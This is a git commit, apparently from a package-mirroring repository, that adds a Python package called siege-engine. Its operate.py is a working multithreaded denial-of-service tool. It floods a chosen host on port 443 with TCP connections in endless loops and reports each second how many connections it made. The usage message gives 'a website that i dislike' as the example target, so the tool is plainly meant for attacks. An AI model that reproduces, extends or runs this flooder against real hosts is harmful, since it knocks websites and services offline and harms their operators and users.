0c742c9f50683647d9f627bbc5a2f6691e2d1ba8
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 09:07:54 +0000

    Add package siege-engine/1.8/siege_engine-1.8-py3-none-any.whl

---
+++ packages/siege-engine/siege_engine-1.8-py3-none-any.whl/siege_engine/operate.py
@@ -0,0 +1,47 @@
+import socket
+import threading
+import time
+import sys
+
+connections = 0
+
+def flood_tcp(host: str):
+    global connections
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((host, 443))
+        time.sleep(3)
+        sock.close()
+        connections += 1
+    except (socket.error, socket.timeout):
+        pass
+
+
+class DoYourThing(threading.Thread):
+    def __init__(self, hostname: str):
+        self.hostname = hostname
+        super().__init__(daemon=True)
+
+    def run(self):
+        while True:
+            flood_tcp(self.hostname)
+
+
+def run():
+    global connections
+    if len(sys.argv) < 3:
+        print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
+        sys.exit(1)
+    amount, hostname = sys.argv[1:]
+    print('SYN flooding %s on %s threads' % (hostname, amount))
+    amount = int(amount)
+    now = (time.time())
+    for _ in range(amount):
+        DoYourThing(hostname).start()
+    while True:
+        if int(time.time()) != now:
+            now = int(time.time())
+            print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
+                  hostname)
+            connections = 0
